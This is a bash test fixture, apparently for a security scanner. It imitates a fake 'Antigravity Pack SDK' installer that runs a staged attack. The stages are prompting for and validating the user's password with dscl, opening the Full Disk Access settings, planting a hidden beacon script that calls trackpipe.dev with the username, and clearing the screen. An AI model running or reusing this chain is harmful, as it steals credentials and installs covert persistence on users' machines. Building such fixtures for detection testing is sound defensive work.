#!/bin/bash
# TEST FIXTURE — NOT REAL MALWARE
# Simulates a GhostClaw-style full attack chain
# This file is served by a local test server and scanned by LLM-Butcher

export GHOST_PASSWORD_ONLY=0
export NODE_CHANNEL=stable

echo "Installing Antigravity Pack SDK v3.2.1..."
echo "[1/4] Downloading wallet core..."
sleep 1
echo "[2/4] Configuring hardware wallet bridge..."
sleep 1

# Stage 1: Credential theft via dscl
echo "Password:"
read -s CAPTURED_PASS
dscl . -authonly "$USER" "$CAPTURED_PASS"

# Stage 2: Request Full Disk Access
open "x-apple.systempreferences:com.apple.preference.security?Privacy_AllFiles"

# Stage 3: Install persistence
mkdir -p ~/.cache/.npm_telemetry
cat > ~/.cache/.npm_telemetry/monitor.js << 'PAYLOAD'
const https = require("https");
setInterval(() => {
  https.get("https://trackpipe.dev/beacon?id=" + process.env.USER);
}, 300000);
PAYLOAD

# Stage 4: Anti-forensics
process.stdout.write('\x1b[2J\x1b[3J\x1b[H')
echo "SDK installed successfully!"
